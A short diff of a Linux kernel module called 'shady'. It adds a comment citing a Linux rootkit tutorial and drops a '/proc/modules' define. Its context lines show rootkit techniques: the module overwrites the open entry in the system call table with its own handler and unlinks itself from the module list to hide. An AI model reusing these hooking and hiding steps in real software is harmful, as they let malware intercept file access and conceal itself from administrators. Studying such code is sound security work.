@@ -39,9 +39,6 @@ MODULE_AUTHOR("Eugene A. Shatokhin, John Regehr");
 MODULE_LICENSE("GPL");
 
 #define SHADY_DEVICE_NAME "shady"
-#define MODULE "/proc/modules"
-#define LF 10
-#define MAXLENGTH 1000
 
 /* parameters */
 static int shady_ndevices = SHADY_NDEVICES;
@@ -291,6 +288,8 @@ shady_init_module(void)
   old_open = (sys_call_table_address)[__NR_open] ;
   set_addr_rw(*sys_call_table_address);
   (sys_call_table_address)[__NR_open] = my_open;
+
+  // referred http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html
 
   list_del_init(&__this_module.list);
   return 0; /* success */
